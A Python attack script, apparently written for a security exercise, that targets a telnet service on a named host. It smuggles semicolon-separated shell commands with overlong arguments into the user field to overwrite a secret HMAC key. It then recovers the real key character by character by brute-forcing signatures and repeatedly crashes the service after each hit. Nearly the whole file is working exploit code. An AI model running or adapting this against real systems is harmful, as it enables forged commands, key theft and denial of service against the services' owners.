from inspect import signature
import telnetlib
import hmac
import hashlib
import string
import time
import os
from dotenv import load_dotenv
load_dotenv()

command = r"mkdir\ aaaaaaaaaaaaaaaaaaaaaaaab"
overwrittenkey = ["a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a"]
user = rf"{os.getenv('INFO_USER')}"
port =int(os.getenv('INFO_PORT'))
print(f"USER: {user} PORT: {port}")
crash = fr"{user};mkdir\ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;{overwrittenkey} \n"
realkey = []
if input("Require input from user to proceed between steps (y/n): ") == "y":
  usenext = True
else: 
  usenext = False
chars = [*string.printable]
chars.pop()
chars.pop()
chars.pop()
chars.pop()
chars.pop()
for i in range(161,255):
  chars.append(chr(i))
print(chars.pop(107))
print(chars, "\n\n")
print(user)
# chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","å","ä","ö","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","Å","Ä","Ö","1","2","3","4","5","6","7","8","9","0"," ","!","?",".",",","*","_","-","€","#","@","/","(",")",]


# guess = rf"aaaaaaaaaaaaaaaaaaaa"
# message = rf"ClientCmd|{user}|{command}{''.join(overwrittenkey)}"
# print(guess)
# hash = hmac.new(guess.encode("ascii"), message.encode("ascii"), hashlib.sha256)
# signature = hash.hexdigest()
# print(signature)

def crashservice():
  tn.open("device1.vikaa.fi",port)
  tn.write(crash.encode("utf8"))
  time.sleep(10)

while overwrittenkey:
  overwrittenkey.pop()
  print("Real key ", realkey)
  print("Overwritten key: ", ''.join(overwrittenkey), ". Overridden characters: ", len(overwrittenkey), "\n")
  found = False
  newcommand = fr"{command}{''.join(overwrittenkey)}"
  print("New command is", newcommand,"With lenght", len(newcommand))
  for char in chars:
    if not found:
      guess = fr"{''.join(overwrittenkey)}{char}{''.join(realkey)}"
      #print("Guess: ", guess, ", Char: ", char , "Commandkey: ", ''.join(overwrittenkey))
      #go = input("Next? \n")
      message = fr"ClientCmd|{user}|{newcommand}"
      hash = hmac.new(guess.encode("utf8"), message.encode("utf8"), hashlib.sha256)
      signature = hash.hexdigest()
      test = f"{user};{newcommand};{signature}\n"
      tn = telnetlib.Telnet()
      tn.open("device1.vikaa.fi",port)
      tn.write(test.encode("utf8"))
      read = tn.read_all()
      print(read.decode(), " When guess was: ", guess)
      tn.close()

      if rb"successful" in read:
        found = True
        realkey.insert(0,char)
        print("Found character: ", char, " Real key is now: ", realkey, " Crashing service")
        crashservice()
      
  if usenext:
    next = input("Search next ? \n")
  else:
    print("Searching next character \n")